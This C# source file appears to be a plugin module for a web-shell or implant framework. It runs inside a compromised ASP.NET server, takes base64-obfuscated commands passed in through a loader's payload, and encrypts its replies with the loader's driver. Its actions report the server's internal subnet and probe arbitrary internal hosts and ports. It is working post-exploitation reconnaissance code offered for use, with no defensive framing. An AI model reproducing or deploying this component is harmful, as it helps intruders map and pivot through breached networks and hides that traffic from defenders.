using System;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Threading;
using System.Net.Sockets;
using System.Net;
using System.Net.NetworkInformation;

public class lan_tools
{
    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam))
            return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }

        return dic;
    }

    private string fnB64Encode(string szInput) => Convert.ToBase64String(Encoding.UTF8.GetBytes(szInput));
    private string fnB64Decode(string szInput) => Encoding.UTF8.GetString(Convert.FromBase64String(szInput));

    private void fnWriteOutput(object driver, HttpResponse response, byte[] abOutput)
    {
        var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
        byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] { abOutput, 1 });

        response.Clear();
        response.ContentType = "application/octet-stream";
        response.BinaryWrite(abEncryptedResp);
    }

    private string getSubnetInfo()
    {
        string subnet = "192.168.1";
        try
        {
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Loopback || ni.OperationalStatus != OperationalStatus.Up)
                    continue;

                IPInterfaceProperties ipProps = ni.GetIPProperties();
                foreach (UnicastIPAddressInformation addr in ipProps.UnicastAddresses)
                {
                    if (addr.Address.AddressFamily == AddressFamily.InterNetwork)
                    {
                        string ip = addr.Address.ToString();
                        if (!ip.StartsWith("127."))
                        {
                            int lastDot = ip.LastIndexOf('.');
                            if (lastDot > 0)
                            {
                                return ip.Substring(0, lastDot);
                            }
                        }
                    }
                }
            }
        }
        catch (Exception)
        {
            
        }
        return subnet;
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null)
            return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object driver = context.Items["driver"];
            int nDllLength = (int)context.Items["len"];

            int nParamOffset = nDllLength + 4;
            int nParamLength = abPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abPayload, nParamOffset, nParamLength).Trim();

            Dictionary<string, string> dic = fnParseParams(szParam);
            
            if (!dic.ContainsKey("z0"))
            {
                fnWriteOutput(driver, response, Encoding.UTF8.GetBytes("{\"status\":\"error\",\"msg\":\"Missing z0\"}"));
                return true;
            }

            string action = fnB64Decode(dic["z0"]).Trim();
            string szResponseResult = "";

            if (action == "info")
            {
                string subnet = getSubnetInfo();
                szResponseResult = "{\"status\":\"success\",\"subnet\":\"" + subnet + "\"}";
            }
            else if (action == "check")
            {
                if (dic.ContainsKey("z2") && dic.ContainsKey("z3"))
                {
                    string targetIp = fnB64Decode(dic["z2"]).Trim();
                    string targetPortStr = fnB64Decode(dic["z3"]).Trim();
                    int targetPort = int.Parse(targetPortStr);

                    bool isOpen = false;
                    TcpClient tcpClient = null;
                    try
                    {
                        tcpClient = new TcpClient();
                        var connectResult = tcpClient.BeginConnect(targetIp, targetPort, null, null);
                        isOpen = connectResult.AsyncWaitHandle.WaitOne(TimeSpan.FromMilliseconds(1500));
                        if (isOpen)
                        {
                            tcpClient.EndConnect(connectResult);
                        }
                    }
                    catch (Exception)
                    {
                        isOpen = false;
                    }
                    finally
                    {
                        if (tcpClient != null)
                        {
                            tcpClient.Close();
                        }
                    }

                    if (isOpen)
                    {
                        szResponseResult = "{\"open\":true,\"ip\":\"" + targetIp + "\",\"port\":" + targetPort + "}";
                    }
                    else
                    {
                        szResponseResult = "{\"open\":false}";
                    }
                }
                else
                {
                    szResponseResult = "{\"open\":false}";
                }
            }
            else
            {
                szResponseResult = "{\"status\":\"error\",\"msg\":\"Unknown action\"}";
            }

            fnWriteOutput(driver, response, Encoding.UTF8.GetBytes(szResponseResult));
        }
        catch (Exception ex)
        {
            response.Write("DARKMATTER_ERROR: " + ex.Message);
        }

        return true;
    }
}